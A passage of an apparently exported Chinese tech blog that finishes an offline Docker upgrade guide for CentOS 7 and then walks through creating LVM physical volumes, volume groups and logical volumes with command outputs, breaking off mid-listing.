-s HUP $MAINPID</span></span><br><span class="line"><span class="comment"># Having non-zero Limit*s causes performance problems due to accounting overhead</span></span><br><span class="line"><span class="comment"># in the kernel. We recommend using cgroups to do container-local accounting.</span></span><br><span class="line"><span class="attr">LimitNOFILE</span>=<span class="string">infinity</span></span><br><span class="line"><span class="attr">LimitNPROC</span>=<span class="string">infinity</span></span><br><span class="line"><span class="attr">LimitCORE</span>=<span class="string">infinity</span></span><br><span class="line"><span class="comment"># Uncomment TasksMax if your systemd version supports it.</span></span><br><span class="line"><span class="comment"># Only systemd 226 and above support this version.</span></span><br><span class="line"><span class="comment">#TasksMax=infinity</span></span><br><span class="line"><span class="attr">TimeoutStartSec</span>=<span class="string">0</span></span><br><span class="line"><span class="comment"># set delegate yes so that systemd does not reset the cgroups of docker containers</span></span><br><span class="line"><span class="attr">Delegate</span>=<span class="string">yes</span></span><br><span class="line"><span class="comment"># kill only the docker process, not all processes in the cgroup</span></span><br><span class="line"><span class="attr">KillMode</span>=<span class="string">process</span></span><br><span class="line"><span class="comment"># restart the docker process if it exits prematurely</span></span><br><span class="line"><span class="attr">Restart</span>=<span class="string">on-failure</span></span><br><span class="line"><span class="attr">StartLimitBurst</span>=<span class="string">3</span></span><br><span class="line"><span class="attr">StartLimitInterval</span>=<span class="string">60s</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=<span class="string">multi-user.target</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>此时，咱们就可以用如下命令，启动 docker，并查看 docker 服务状态。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">docker version</span><br></pre></td></tr></tbody></table></figure> <img src="/p/28064c7/启动并查看docker服务状态.webp" alt="启动并查看docker服务状态"><p></p></li>
<li><p>再通过 <code>docker version</code> 命令查看安装的 docker 软件版本，会发现现在安装的版本是 <code>1.31.1</code>，而截止目前（2021/07/17），官方最新的版本是 <code>20.10.7</code>。
<img src="/p/28064c7/查看docker版本.webp" alt="查看docker版本"></p></li>
</ol>
<h2 id="下载docker软件包">3.3. 下载 docker 软件包</h2>
<ol type="1">
<li><p>因此，咱们可以访问如下地址，根据系统版本和 CPU 架构及位数，下载对应最新版本的 rpm 包。
&gt; 视下载速度选择即可 &gt; https://download.docker.com &gt;
https://repo.huaweicloud.com/docker-ce/</p></li>
<li><p> 以 64 位 CPU 的 CentOS 7 版本为例，下载地址和所需要的软件包列表如下。
https://download.docker.com/linux/centos/7/x86_64/stable/Packages/ &gt;
- containerd.io-1.4.6-3.1.el7.x86_64.rpm &gt; -
docker-ce-20.10.7-3.el7.x86_64.rpm &gt; -
docker-ce-cli-20.10.7-3.el7.x86_64.rpm &gt; -
docker-ce-rootless-extras-20.10.7-3.el7.x86_64.rpm &gt; -
docker-scan-plugin-0.8.0-3.el7.x86_64.rpm</p></li>
</ol>
<h2 id="卸载旧版本docker软件包">3.4. 卸载旧版本 docker 软件包</h2>
<ol type="1">
<li>执行如下命令，卸载旧版本的 docker 软件包。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">yum remove docker*</span><br><span class="line">yum remove docker-common</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="上传并安装docker软件包">3.5. 上传并安装 docker 软件包</h2>
<ol type="1">
<li><p>同样使用 root 用户，将上一步下载好的最版本 docker 软件包上传至 Linux 服务器，并进入所在目录。
<img src="/p/28064c7/最新版docker软件包列表.webp" alt="最新版docker软件包列表"></p></li>
<li><p>按照如下顺序的命令，依次安装软件包。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpm -Uvh containerd.io-1.4.6-3.1.el7.x86_64.rpm</span><br><span class="line">rpm -Uvh docker-scan-plugin-0.8.0-3.el7.x86_64.rpm docker-ce-cli-20.10.7-3.el7.x86_64.rpm</span><br><span class="line">rpm -Uvh docker-ce-20.10.7-3.el7.x86_64.rpm docker-ce-rootless-extras-20.10.7-3.el7.x86_64.rpm</span><br></pre></td></tr></tbody></table></figure> <img src="/p/28064c7/安装最新版docker-第一步.webp" alt="安装最新版docker-第一步"> <img src="/p/28064c7/安装最新版docker-第二步.webp" alt="安装最新版docker-第二步"> <img src="/p/28064c7/安装最新版docker-第三步.webp" alt="安装最新版docker-第三步"><p></p></li>
<li><p>再次用 <code>docker version</code> 命令，查看下 docker 版本，可发现已成功更新至最新版本 <code>20.10.7</code>。
<img src="/p/28064c7/查看更新后的docker版本.webp" alt="查看更新后的docker版本"></p></li>
<li><p>最后，咱们需要重启一下 docker 服务，执行如下命令，重启并查看 docker 服务运行状态，如果是绿色的 active，则表示 docker 已成功安装并运行。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">systemctl status docker</span><br></pre></td></tr></tbody></table></figure> <img src="/p/28064c7/重启docker服务并查看状态.webp" alt="重启docker服务并查看状态"><p></p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>离线安装docker</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 CentOS7 系统的 LVM 简单介绍及使用</title>
    <url>/p/1f59bcb7.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  LVM，即 Logical Volume
Manager，其中文含义是<code>逻辑卷管理</code>，是 Linux 环境下对磁盘分区进行管理的一种机制。在普通的磁盘分区模式下，当磁盘分区不恰当时，过大的文件无法跨磁盘 / 分区进行存储。而使用了 LVM 机制的系统，则可以项目的需求，任意组合挂载的多个磁盘，使其成为一个整体的磁盘进行使用，同时可以在无需关闭电源，且不破坏磁盘数据的情况下，灵活多变的规划分区大小。</p>
<span id="more"></span>
<hr>
<h1 id="环境说明">2. 环境说明</h1>
<blockquote>
<p>在虚拟机环境中配置</p>
</blockquote>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 12%">
<col style="width: 80%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">名称</th>
<th style="text-align: center;">备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;"> 系统版本</td>
<td style="text-align: center;"> centos7-1 3.10.0-1160.el7.x86_64</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;"> 处理器</td>
<td style="text-align: center;"> i5-8400，分配一颗核心即可</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td style="text-align: center;"> 内存</td>
<td style="text-align: center;"> 2G</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;"> 网络适配器</td>
<td style="text-align: center;">单个网卡，桥接模式</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 5</td>
<td style="text-align: center;"> 硬盘</td>
<td style="text-align: center;"> 4 块虚拟硬盘，20G+10G+10G+10G<br>一块系统盘，三块数据盘搭建 LVM</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="lvm基本术语及关系">3. LVM 基本术语及关系</h1>
<h2 id="基本术语">3.1. 基本术语</h2>
<blockquote>
<p>参考来源： https://wiki.archlinux.org/title/LVM#Background 1.
物理存储介质（Physical Storage
Media）：即咱们生活中常见一块块的物理硬盘，在 Linux 中通过 fdisk 工具中，其展现的形式类似于 <code>/dev/sdb</code>、<code>/dev/sdc</code>、<code>/dev/sdd</code> 等等。
2. 物理卷（Physical
Volume，PV）：物理卷则指的是某一块磁盘中具体划分的分区了，例如 <code>/dev/sdb1</code>、<code>/dev/sdb2</code>、<code>/dev/sdc1</code> 等。
3. 卷组（Volume Group， VG）：
类似于非 LVM 系统中的系统磁盘，可以指定任意个空闲的物理卷组成（无需关注物理卷是否所属同一个物理介质以及卷号的连续性）。
4. 逻辑卷（Logical
Volume，LV）：基于某个卷组分配出来的分区，称之为逻辑卷，一个卷组可划分出多个逻辑卷，并且可以任意扩容、格式化等。</p>
</blockquote>
<h2 id="关系">3.2. 关系</h2>
<p>物理存储介质、物理卷、卷组合逻辑卷之前的组成及关系如下所示。 <img src="https://www.hualigs.cn/image/60c583d968868.jpg" alt="LVM内部关系"></p>
<hr>
<h1 id="lvm部署步骤">4. LVM 部署步骤</h1>
<h2 id="安装lvm软件包">4.1. 安装 lvm 软件包</h2>
<ol type="1">
<li>执行 <code>yum install -y lvm2</code> 命令，安装 lvm2 软件包。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# yum install -y lvm2</span><br><span class="line">已加载插件：fastestmirror, langpacks</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">软件包 7:lvm2-2.02.187-6.el7_9.5.x86_64 已安装并且是最新版本</span><br><span class="line">无须任何处理</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="查看当前挂载的磁盘信息">4.2. 查看当前挂载的磁盘信息</h2>
<ol type="1">
<li>执行 <code>fdisk -l</code> 命令（可能需要 root 权限），可查看系统当前挂载了四个磁盘，其中用于部署 LVM 的磁盘是 <code>/dev/sdb</code>、<code>/dev/sdc</code> 和 <code>/dev/sddd</code>。
&gt; 后续内容及命令输出，均忽略 <code>/dev/sda</code> 系统盘的信息。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# fdisk -l</span><br><span class="line"></span><br><span class="line">磁盘 /dev/sda：21.5 GB, 21474836480 字节，41943040 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0x000ac10d</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048     2099199     1048576   83  Linux</span><br><span class="line">/dev/sda2         2099200    41943039    19921920   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">磁盘 /dev/sdb：10.7 GB, 10737418240 字节，20971520 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/sdc：10.7 GB, 10737418240 字节，20971520 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/sdd：10.7 GB, 10737418240 字节，20971520 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="磁盘分区并转换格式">4.3. 磁盘分区并转换格式</h2>
<blockquote>
<p>磁盘管理工具 fdisk 的基本使用，可参考<a href="/p/f9323c68.html" target="_blank">《【Linux】基于
Ubuntu 临时 / 永久挂载外置移动硬盘》。</a></p>
</blockquote>
<ol type="1">
<li><p>将 <code>/dev/sdc</code> 盘新建两个分区。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# fdisk /dev/sdc</span><br><span class="line">欢迎使用 fdisk (util-linux 2.23.2)。</span><br><span class="line"></span><br><span class="line">更改将停留在内存中，直到您决定将更改写入磁盘。</span><br><span class="line">使用写入命令前请三思。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p</span><br><span class="line">分区号 (1-4，默认 1)：1</span><br><span class="line">起始 扇区 (2048-20971519，默认为 2048)：</span><br><span class="line">将使用默认值 2048</span><br><span class="line">Last 扇区, +扇区 or +size{K,M,G} (2048-20971519，默认为 20971519)：+4G</span><br><span class="line">分区 1 已设置为 Linux 类型，大小设为 4 GiB</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p</span><br><span class="line">分区号 (2-4，默认 2)：2</span><br><span class="line">起始 扇区 (8390656-20971519，默认为 8390656)：</span><br><span class="line">将使用默认值 8390656</span><br><span class="line">Last 扇区, +扇区 or +size{K,M,G} (8390656-20971519，默认为 20971519)：</span><br><span class="line">将使用默认值 20971519</span><br><span class="line">分区 2 已设置为 Linux 类型，大小设为 6 GiB</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">正在同步磁盘。</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>将创建的两个分区都转换成 <code>8e</code> 格式。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# fdisk /dev/sdc</span><br><span class="line">欢迎使用 fdisk (util-linux 2.23.2)。</span><br><span class="line"></span><br><span class="line">更改将停留在内存中，直到您决定将更改写入磁盘。</span><br><span class="line">使用写入命令前请三思。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：t</span><br><span class="line">分区号 (1,2，默认 2)：1</span><br><span class="line">Hex 代码(输入 L 列出所有代码)：8e</span><br><span class="line">已将分区“Linux”的类型更改为“Linux LVM”</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：t</span><br><span class="line">分区号 (1,2，默认 2)：2</span><br><span class="line">Hex 代码(输入 L 列出所有代码)：8e</span><br><span class="line">已将分区“Linux”的类型更改为“Linux LVM”</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：w</span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">正在同步磁盘。</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>通过 <code>fdisk -l &lt;物理磁盘名&gt;</code> 命令，可看到 /dev/sdc 已成功创建了两个 <code>8e</code> 格式的分区。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# fdisk -l /dev/sdc</span><br><span class="line"></span><br><span class="line">磁盘 /dev/sdc：10.7 GB, 10737418240 字节，20971520 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0xe2480e32</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdc1            2048        2054           3+  8e  Linux LVM</span><br><span class="line">/dev/sdc2            4096    20971519    10483712   8e  Linux LVM</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>重复步骤 2-3，将另外两个磁盘也创建分区并转换好格式。</p></li>
<li><p>使用 <code>lvmdiskscan</code> 命令，查看可用于搭建 lvm 物理卷的设备信息。可看到除了系统盘 <code>sda</code> 以外，还有刚刚创建的几个分区也在其中，但因为还未创建物理卷，所以暂未显示 <code>LVM physical volume</code> 字样。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvmdiskscan</span><br><span class="line">  /dev/sda1 [       1.00 GiB]</span><br><span class="line">  /dev/sda2 [     &lt;19.00 GiB] LVM physical volume</span><br><span class="line">  /dev/sdb1 [     &lt;10.00 GiB]</span><br><span class="line">  /dev/sdc1 [       4.00 GiB]</span><br><span class="line">  /dev/sdc2 [      &lt;6.00 GiB]</span><br><span class="line">  /dev/sdd1 [     &lt;10.00 GiB]</span><br><span class="line">  0 disks</span><br><span class="line">  5 partitions</span><br><span class="line">  0 LVM physical volume whole disks</span><br><span class="line">  1 LVM physical volume</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<h2 id="创建物理卷pv">4.4. 创建物理卷 PV</h2>
<ol type="1">
<li>到这里，可用于 lvm 部署的分区就准备好了，接下来，就需要对这些分区进行创建物理卷，使其能够被 lvm 识别。</li>
<li>执行 <code>pvcreate &lt;物理卷01&gt; &lt;物理卷02&gt; ...</code> 命令，以同时创建 LVM 物理卷。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# pvcreate /dev/sdb1 /dev/sdc1 /dev/sdc2 /dev/sdd1</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb1"</span> successfully created.</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc1"</span> successfully created.</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc2"</span> successfully created.</span><br><span class="line">  Physical volume <span class="string">"/dev/sdd1"</span> successfully created.</span><br></pre></td></tr></tbody></table></figure></li>
<li>使用 <code>pvs</code> 命令，查看 lvm 物理卷信息，可看到现在就有了 4 个 LVM 物理卷了。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# pvs</span><br><span class="line">  PV         VG     Fmt  Attr PSize   PFree</span><br><span class="line">  /dev/sda2  centos lvm2 a--  &lt;19.00g      0</span><br><span class="line">  /dev/sdb1         lvm2 a--  &lt;10.00g &lt;10.00g</span><br><span class="line">  /dev/sdc1         lvm2 ---    4.00g   4.00g</span><br><span class="line">  /dev/sdc2         lvm2 ---   &lt;6.00g  &lt;6.00g</span><br><span class="line">  /dev/sdd1         lvm2 ---  &lt;10.00g &lt;10.00g</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="创建卷组vg">4.5. 创建卷组 VG</h2>
<ol type="1">
<li>现在，咱们一共有 4 个可用的 LVM 物理卷，计划将这 4 个物理卷统一划分为 2 个卷组。</li>
<li>通过 <code>vgcreate &lt;卷组名&gt; &lt;物理卷01&gt; &lt;物理卷01&gt; ...</code> 命令，将多个物理卷分区创建成一个卷组，其中卷组名根据需要自定义。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# vgcreate vg01  /dev/sdb1 /dev/sdc1</span><br><span class="line">  Volume group <span class="string">"vg01"</span> successfully created</span><br></pre></td></tr></tbody></table></figure></li>
<li>执行 <code>vgs</code> 命令，查看卷组列表信息。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# vgs</span><br><span class="line">  VG     <span class="comment">#PV #LV #SN Attr   VSize   VFree</span></span><br><span class="line">  centos   1   2   0 wz--n- &lt;19.00g     0</span><br><span class="line">  vg01     2   0   0 wz--n-  13.99g 13.99g</span><br></pre></td></tr></tbody></table></figure></li>
<li>按照步骤 2-3，将 /dev/sdc1 和 /dev/sdd1 创建为卷组 <code>vg02</code>。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# vgcreate vg02 /dev/sdc2 /dev/sdd1</span><br><span class="line">  Volume group <span class="string">"vg02"</span> successfully created</span><br><span class="line">[root@centos7-1 ~]# vgs</span><br><span class="line">  VG     <span class="comment">#PV #LV #SN Attr   VSize   VFree</span></span><br><span class="line">  centos   1   2   0 wz--n- &lt;19.00g     0</span><br><span class="line">  vg01     2   0   0 wz--n-  13.99g 13.99g</span><br><span class="line">  vg02     2   0   0 wz--n-  15.99g 15.99g</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="创建逻辑卷lv">4.6. 创建逻辑卷 LV</h2>
<blockquote>
<p>按照 <a href="#3-2-关系">3.2. 关系</a>章节所示，创建逻辑卷。 1.
创建逻辑卷的命令格式是：<code>lvcreate -L &lt;卷大小&gt; &lt;卷组名&gt; -n &lt;卷名&gt;</code>，在卷组 <code>vg01</code> 中，创建 3 个逻辑卷，大小分别是 5G、5G 和 4G。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvcreate -L 5G vg01 -n lv_doc</span><br><span class="line">  Logical volume <span class="string">"lv_doc"</span> created.</span><br><span class="line">[root@centos7-1 ~]# lvcreate -L 5G vg01 -n lv_music</span><br><span class="line">  Logical volume <span class="string">"lv_music"</span> created.</span><br><span class="line">[root@centos7-1 ~]# lvcreate -L 4G vg01 -n lv_data</span><br><span class="line">  Volume group <span class="string">"vg01"</span> has insufficient free space (1022 extents): 1024 required.</span><br></pre></td></tr></tbody></table></figure> 2.
利用 <code>lvs</code> 命令，查看已创建的逻辑卷信息。发现 <code>lv_data</code> 并未输出结果列表中。根据上一条命令的输出，发现直接使用 <code>-L 4g</code> 参数创建逻辑卷时，由于卷组 vg01 总容量不是严格的 14G，所以输出了超出剩余空间的提示。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV       VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root     centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap     centos -wi-ao----   2.00g</span><br><span class="line">  lv_doc   vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music vg01   -wi-a-----   5.00g</span><br></pre></td></tr></tbody></table></figure> 3.
此时，咱们就需要指定另外一个参数 <code>-l</code> 了，虽然都是同一个字母，但大小不同，其代表的含义也不同，需要特别注意区分，切勿混用。
4.
通过执行 <code>lvcreate -l +100%FREE vg01 -n lv_data</code> 命令，将剩余的空间容量，100% 的分给 <code>lv_data</code> 逻辑卷。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvcreate -l +100%FREE vg01 -n lv_data</span><br><span class="line">  Logical volume <span class="string">"lv_data"</span> created.</span><br></pre></td></tr></tbody></table></figure> 5. 再次使用 <code>lvs</code> 命令，查看逻辑卷信息。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV       VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root     centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap     centos -wi-ao----   2.00g</span><br><span class="line">  lv_data  vg01   -wi-a-----   3.99g</span><br><span class="line">  lv_doc   vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music vg01   -wi-a-----   5.00g</span><br></pre></td></tr></tbody></table></figure> 6.
重复步骤 1-5，将卷组 <code>vg02</code> 划分一个逻辑卷，剩余空间暂时保留闲置。
如下示例中的 - l 参数值是 50% VG，其意义是将整个卷组容量的 50%，划分给逻辑卷，卷组 <code>vg02</code> 的总容量是大约 16G，所以逻辑卷 <code>lv_backup</code> 创建后的大小是大约 8G。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lvcreate -l 50%VG vg02 -n lv_backup</span><br><span class="line">  Logical volume <span class="string">"lv_backup"</span> created.</span><br><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV        VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root      centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap      centos -wi-ao----   2.00g</span><br><span class="line">  lv_data   vg01   -wi-a-----   3.99g</span><br><span class="line">  lv_doc    vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music  vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_backup vg02   -wi-a-----  &lt;8.00g</span><br></pre></td></tr></tbody></table></figure><p></p>
</blockquote>
<h2 id="逻辑卷访问">4.7. 逻辑卷访问</h2>
<ol type="1">
<li>创建好之后的逻辑卷，就可以跟普通磁盘分区一样正常访问了。可通过 <code>lsblk</code> 命令查看，逻辑卷跟普通分区，都展示在输出列表中。</li>
<li>需要注意的是，访问这些逻辑卷，应该使用逻辑分区路径（例如：<code>/dev/mapper/vg01-lv_doc</code> 或 <code>/dev/vg01/lv_doc</code>），而不应该是其实际分区设备路径（例如：<code>/dev/sdc1</code>）。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# lsblk</span><br><span class="line">NAME               MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda                  8:0    0   20G  0 disk</span><br><span class="line">├─sda1               8:1    0    1G  0 part /boot</span><br><span class="line">└─sda2               8:2    0   19G  0 part</span><br><span class="line">  ├─centos-root    253:0    0   17G  0 lvm  /</span><br><span class="line">  └─centos-swap    253:1    0    2G  0 lvm  [SWAP]</span><br><span class="line">sdb                  8:16   0   10G  0 disk</span><br><span class="line">└─sdb1               8:17   0   10G  0 part</span><br><span class="line">  ├─vg01-lv_doc    253:2    0    5G  0 lvm</span><br><span class="line">  └─vg01-lv_music  253:3    0    5G  0 lvm</span><br><span class="line">sdc                  8:32   0   10G  0 disk</span><br><span class="line">├─sdc1               8:33   0    4G  0 part</span><br><span class="line">│ ├─vg01-lv_music  253:3    0    5G  0 lvm</span><br><span class="line">│ └─vg01-lv_data   253:4    0    4G  0 lvm</span><br><span class="line">└─sdc2               8:34   0    6G  0 part</span><br><span class="line">  └─vg02-lv_backup 253:5    0   12G  0 lvm  /mnt/backup</span><br><span class="line">sdd                  8:48   0   10G  0 disk</span><br><span class="line">└─sdd1               8:49   0   10G  0 part</span><br><span class="line">  └─vg02-lv_backup 253:5    0   12G  0 lvm  /mnt/backup</span><br><span class="line">sr0                 11:0    1  4.4G  0 rom</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="逻辑卷挂载">4.8. 逻辑卷挂载</h2>
<ol type="1">
<li><p>挂载逻辑卷之前，需要先对逻辑卷建立文件系统，可以利用 <code>mkfs</code> 对逻辑卷格式化成 <code>ext4</code> 等需要的文件系统类型。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# mkfs -t ext4 /dev/mapper/vg02-lv_backup</span><br><span class="line">mke2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">文件系统标签=</span><br><span class="line">OS <span class="built_in">type</span>: Linux</span><br><span class="line">块大小=4096 (<span class="built_in">log</span>=2)</span><br><span class="line">分块大小=4096 (<span class="built_in">log</span>=2)</span><br><span class="line">Stride=0 blocks, Stripe width=0 blocks</span><br><span class="line">524288 inodes, 2096128 blocks</span><br><span class="line">104806 blocks (5.00%) reserved <span class="keyword">for</span> the super user</span><br><span class="line">第一个数据块=0</span><br><span class="line">Maximum filesystem blocks=2147483648</span><br><span class="line">64 block <span class="built_in">groups</span></span><br><span class="line">32768 blocks per group, 32768 fragments per group</span><br><span class="line">8192 inodes per group</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632</span><br><span class="line"></span><br><span class="line">Allocating group tables: 完成</span><br><span class="line">正在写入inode表: 完成</span><br><span class="line">Creating journal (32768 blocks): 完成</span><br><span class="line">Writing superblocks and filesystem accounting information: 完成</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>挂载逻辑卷时，同样需要使用的是逻辑卷对应的逻辑路径。例如将逻辑卷 <code>lv_backup</code> 挂载至 <code>/mnt/backup</code> 目录，命令如下。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# <span class="built_in">mkdir</span> /mnt/backup</span><br><span class="line">[root@centos7-1 ~]# mount /dev/mapper/vg02-lv_backup /mnt/backup/</span><br><span class="line">[root@centos7-1 ~]# <span class="built_in">ls</span> -al /mnt/backup/</span><br><span class="line">总用量 20</span><br><span class="line">drwxr-xr-x. 3 root root  4096 6月  13 17:42 .</span><br><span class="line">drwxr-xr-x. 3 root root    20 6月  13 17:43 ..</span><br><span class="line">drwx------. 2 root root 16384 6月  13 17:42 lost+found</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>至此，LVM 的搭建以及逻辑卷的挂载，就完成了，能够可以跟普通的磁盘分区一样进行访问使用。</p></li>
</ol>
<h2 id="逻辑卷调整">4.9. 逻辑卷调整</h2>
<ol type="1">
<li>以上步骤还只是阐述了逻辑卷的创建，本小节，将以逻辑卷 <code>lv_backup</code> 为例，介绍如何对逻辑卷的大小进行调整。</li>
<li>首先，通过 <code>vgs</code> 和 <code>lvs</code> 命令可以知道，卷组 <code>vg01</code> 总容量 16G，只使用了 8G，划分给了当前的逻辑卷 <code>lv_backup</code>。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@centos7-1 ~]# vgs</span><br><span class="line">  VG     <span class="comment">#PV #LV #SN Attr   VSize   VFree</span></span><br><span class="line">  centos   1   2   0 wz--n- &lt;19.00g     0</span><br><span class="line">  vg01     2   3   0 wz--n-  13.99g     0</span><br><span class="line">  vg02     2   1   0 wz--n-  15.99g &lt;8.00g</span><br><span class="line">[root@centos7-1 ~]# lvs</span><br><span class="line">  LV        VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  root      centos -wi-ao---- &lt;17.00g</span><br><span class="line">  swap      centos -wi-ao----   2.00g</span><br><span class="line">  lv_data   vg01   -wi-a-----   3.99g</span><br><span class="line">  lv_doc    vg01   -wi-a-----   5.00g</span><br><span class="line">  lv_music  vg01   